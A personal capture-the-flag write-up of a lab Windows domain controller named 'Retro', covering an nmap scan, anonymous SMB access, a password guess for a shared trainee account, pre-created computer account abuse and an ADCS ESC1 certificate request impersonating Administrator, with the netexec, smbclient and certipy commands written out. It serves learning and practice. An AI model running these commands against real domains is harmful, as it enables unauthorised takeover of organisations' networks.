# Retro

## Nmap scan:
```
Nmap scan report for 10.129.12.136
Host is up (0.018s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-06-11 12:02:35Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2026-06-11T11:50:18
|_Not valid after:  2027-06-11T11:50:18
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2026-06-11T11:50:18
|_Not valid after:  2027-06-11T11:50:18
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2026-06-11T11:50:18
|_Not valid after:  2027-06-11T11:50:18
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2026-06-11T11:50:18
|_Not valid after:  2027-06-11T11:50:18
|_ssl-date: TLS randomness does not represent time
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-06-11T12:04:03+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC.retro.vl
| Not valid before: 2026-06-10T11:59:27
|_Not valid after:  2026-12-10T11:59:27
| rdp-ntlm-info: 
|   Target_Name: RETRO
|   NetBIOS_Domain_Name: RETRO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: retro.vl
|   DNS_Computer_Name: DC.retro.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-06-11T12:03:24+00:00
9389/tcp  open  mc-nmf        .NET Message Framing
49519/tcp open  msrpc         Microsoft Windows RPC
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
53084/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
53093/tcp open  msrpc         Microsoft Windows RPC
54926/tcp open  msrpc         Microsoft Windows RPC
54944/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-06-11T12:03:26
|_  start_date: N/A
```

## Writeups:
Alright, an nmap scan reveals a crap ton of open ports.
I decide to start by looking at port `445` which is running `smb`.
Netexec informs me that null auth is possible.
- `SMB         10.129.12.136   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)`

Thus I try to login using `smbclient.py` and an empty password:
- `smbclient.py anonymous@10.129.12.136`

From there I enumerate the shares:
```
Share Name                Type            Comment
----------------------------------------------------------------------
ADMIN$                    DISK (SPECIAL)  Remote Admin
C$                        DISK (SPECIAL)  Default share
IPC$                      IPC (SPECIAL)   Remote IPC
NETLOGON                  DISK            Logon server share 
Notes                     DISK
SYSVOL                    DISK            Logon server share 
Trainees                  DISK
```

In the `Trainees` share, I find a file called `Important.txt`.
This file contains the following text:
```
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admins
```

So now I just need to find the right creds.
With netexec I enumerate the users via `smb`.
The results returned the `trainee` account:
- `SMB         10.129.12.136   445    DC               1104: RETRO\trainee (SidTypeUser)`

I decide to try and bruteforce the password with netexec:
- `nxc smb DC.retro.vl -u 'RETRO/trainee -p ~/SecLists/Passwords/Leaked-Databases/rockyou-75.txt`
However, after about 5 minutes, I feel like this is likely the wrong path.
I decide to try the user's username as the password, thus`trainee`.

This works...
Logging in via `smb` I find the `user.txt` flag.
In addition I find a `ToDo.txt` containing the following:
```
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James
```

I think the account mentioned in this file is `RETRO/BANKING$`.
I'm guessing this is a pre2k account, and thus I test that with netexec:
- `nxc ldap DC.retro.vl -u 'trainee' -p 'trainee' -M pre2k`
Which confirms this is a pre-created computer account.
However, getting the `TGT` (ticket granting ticket) fails. 
Turns out this is a DNS issue, and adding `RETRO.VL` to `/etc/hosts` fixes this.

To use the `TGT` I set the environment `KRB5CCNAME` environment variable:
- `export KRB5CCNAME=/home/<username>/.nxc/modules/pre2k/ccache/banking.ccache `

I can then use this to authenticate as `BANKING$` like so:
- `smbclient.py -k -no-pass -debug 'DC.retro.vl'`

I use `certipy` to check for `ADCS` vulnerabilities, to which I see the template `RetroClients` is vulnerable to `ESC1`.
- `certipy find -dc-ip 10.129.12.136 -u 'trainee@retro.vl' -p 'trainee'`

I exploit this like so:
`certipy req -u 'BANKING$@retro.vl' -k -dc-ip '10.129.12.136' -ca 'retro-DC-CA' -template 'RetroClients' -dc-host 'DC.retro.vl' -upn 'Administrator@retro.vl' -key-size 4096 -target 'DC.retro.vl'`


## Commands Used:
- `nxc smb 10.129.12.136`
- `smbclient.py anonymous@10.129.12.136`
- `nxc smb 10.129.12.136 -u 'anonymous' -p '' --rid-brute`
- `smbclient.py trainee:trainee@10.129.12.136`
- `smbclient.py -k -no-pass -debug 'DC.retro.vl'`
